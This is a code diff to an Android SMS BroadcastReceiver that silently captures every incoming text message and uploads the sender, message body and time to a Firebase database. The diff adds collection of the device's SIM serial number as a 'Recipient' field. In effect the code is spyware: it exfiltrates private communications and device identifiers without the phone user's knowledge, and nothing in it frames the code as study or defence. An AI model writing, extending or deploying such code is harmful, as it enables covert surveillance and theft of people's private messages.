@@ -1,17 +1,27 @@
 package com.example.super_secret;
 
+import android.Manifest;
 import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
 
 //time format
+import androidx.core.app.ActivityCompat;
+
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
+import java.util.Date;
+
 
 
 import com.google.firebase.database.DatabaseReference;
@@ -25,13 +35,20 @@ public class MyReceiver extends BroadcastReceiver {
     private static byte[] userData;
     private static String timeStamp;
 
-
     // Write a message to the database
     FirebaseDatabase database = FirebaseDatabase.getInstance();
     DatabaseReference myRef = database.getReference().child("users").push();
 
+
     @Override
     public void onReceive(Context context, Intent intent) {
+
+        // get own phone number
+        TelephonyManager tMgr = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            return;
+        }
+        String mPhoneNumber = tMgr.getSimSerialNumber();
 
         // Create a DateFormatter object for displaying date in specified format.
         SimpleDateFormat formatter = new SimpleDateFormat("hh:mm:ss aa dd/MM/yyyy");
@@ -73,10 +90,12 @@ public class MyReceiver extends BroadcastReceiver {
                 // Uncomment this to display a text popup of the following variables on the phone screen
                 //Toast.makeText(context,"Message: " +msg + "\nNumber: " + phoneNo, Toast.LENGTH_LONG).show();
 
-                myRef.child("number").setValue(phoneNo);
-                myRef.child("message").setValue(msg);
-                myRef.child("time").setValue(timeStamp);
-            }
+                myRef.child("Sender").setValue(phoneNo);
+                myRef.child("Message").setValue(msg);
+                myRef.child("Time").setValue(timeStamp);
+                myRef.child("Recipient").setValue(mPhoneNumber);
+        }
 
     }
-}}
+}
+}
